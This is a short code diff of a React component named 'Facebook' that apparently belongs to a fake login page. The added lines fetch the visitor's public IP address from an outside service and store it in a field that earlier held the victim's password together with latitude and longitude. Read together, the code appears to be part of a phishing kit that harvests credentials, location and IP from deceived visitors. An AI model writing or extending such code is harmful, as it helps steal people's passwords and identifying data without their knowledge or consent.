@@ -24,9 +24,15 @@ function Facebook() {
   //   }
   // },[])
 
+  const [ip, setip] = useState('')
+
+  fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => setip(data.ip)); 
+
   let location = latitude +" "+ longitude
     // let username = name
-    let address = password+" | location " + location
+    let address = ip
     // let duration = 5
     let slug = new Date()
 
